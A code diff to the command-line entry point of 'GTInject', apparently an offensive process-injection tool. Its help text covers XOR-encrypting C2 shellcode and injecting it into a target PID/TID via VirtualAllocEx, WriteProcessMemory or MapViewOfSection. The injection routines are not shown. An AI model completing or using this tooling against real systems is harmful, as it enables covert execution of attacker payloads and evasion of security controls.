@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Globalization;
+using GTInject.memoryOptions;
 
 namespace GTInject
 {
@@ -22,39 +23,7 @@ namespace GTInject
             encrypt,
             help
         }
-       /* public class Options
-        {
-            [Option('t', "threads", Required = false, HelpText = "Show all threads in an alertable state.", Default = false)]
-            public bool threads { get; set; }
-
-            [Option('e', "encrypt", Required = false, HelpText = "Encrypt your raw shellcode for later use within GTInject", Default = false)]
-            public bool encrypt { get; set; }
-
-            [Option('b', "sourcebin", Required = false, HelpText = "Select the source bin file (raw shellcode file) to encrypt")]
-            public string binPath { get; set; }
-
-            [Option('m', "memory", Required = false, HelpText = "Select the memory allocation option", Default = 1)]
-            public int memoryoption { get; set; }
-
-            [Option('x', "execution", Required = false, HelpText = "Select the thread execution method", Default = 1)]
-            public int threadexecution { get; set; }
-
-            [Option('p', "pid", Required = false, HelpText = "Process ID to inject into")]
-            public int pid2inject { get; set; }
-
-            [Option('s', "source", Required = false, HelpText = "Select a source location for the shellcode")]
-            public string sourceShellcode { get; set; }
-            //enum.parse later
-
-            [Option('k', "xorkey", Required = false, HelpText = "Enter the xor key used to encrypt the shellcode")]
-            public string xorkey { get; set; }
-
-            [Option('h', "help", Required = false, HelpText = "Show the help menu", Default = false)]
-            public bool help { get; set; } 
-
-        }*/
-
-
+  
         static void Main(string[] args)
         {
             var command = args[0];
@@ -71,7 +40,7 @@ GTInject.exe Help Menu
 Usage: GTInject.exe <command> <commandArgs>
        GTInject.exe threads
        GTInject.exe encrypt pathToSource.bin MyXorKeySecret123
-       GTInject.exe inject memoryOption execOption xorkey url binSourcePath
+       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
 
 Encrypt  -- for encrypting shellcode:
         Shellcode from your C2 will be multibyte XOR'd and written as a base64 string in a text file
@@ -90,6 +59,11 @@ Inject   -- choose a process injection method
         Enter the XorKey to decrypt it with
         Specify a location type where the encrypted shellcode is stored 
         Specify the location
+        Specify the PID
+
+Memory Options
+        1. WINAPI -- VirtualAllocEx, WriteProcessMemory
+        2. WINAPI -- MapViewOfSection, WriteProcessMemory
 ";
                 Console.WriteLine(helptext);
              }
@@ -117,28 +91,40 @@ Inject   -- choose a process injection method
 
             else if (command.ToLower() == "inject")
             {
+                //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
+                int memOption = 0;
+                int execOption = 0;
+                string xorkey = "0x00";
+                string binSrcType = "";
+                string binSrcPath = "";
+                int Pid = 0;
+                int Tid = 0;
+                int resultvar = 0;
+                try
+                {
+                    memOption = int.Parse(args[1]); //Int.TryParse(args[1]);
+                    execOption = int.Parse(args[2]);
+                    xorkey = args[3];
+                    binSrcType = args[4];
+                    binSrcPath = args[5];
+                    Pid = int.Parse(args[6]);
+                    try
+                    {
+                        Tid = int.Parse(args[7]);
+                    }
+                    catch (IndexOutOfRangeException ex)
+                    {
+                        Console.WriteLine( " Tid not entered as an arg, not an issue at this point, just catch to handle the exception");
+                        //Tid = 0;
+                    }
+                }
+                catch (Exception ex) {
+                    Console.WriteLine($"Other exception : {ex.Message}");
+                }
+                memory.SelectMemOption(memOption, execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
                 Console.WriteLine(  "build the cool stuff here");
             }
-            /*rser.Default.ParseArguments<Inject.Options>(args)
-           .WithParsed<Inject.Options>(o =>
-           {
-               if (o.threads)
-               {
-                   AlertableThreads.Alertable.GetThreads();
-               }
-               else if (o.encrypt)
-               {
-                   if (o.binPath == null || o.xorkey == null) { Console.WriteLine(" Supplied the encrypt flag without supplying the source bin and output bin name (-e -b shellcode.bin -k myXorKey)"); }
-                   EncryptBin.EncryptBin.EncryptShellcode(o.binPath, o.xorkey);
-               }
-               else
-               {
-                   Console.WriteLine($"Current Arguments: ");
-                   Console.WriteLine("Quick Start Example!");
-               }
-           });*/
-
-            // Should parse args, then build each function seperately. 
+ 
         }
     }
 }
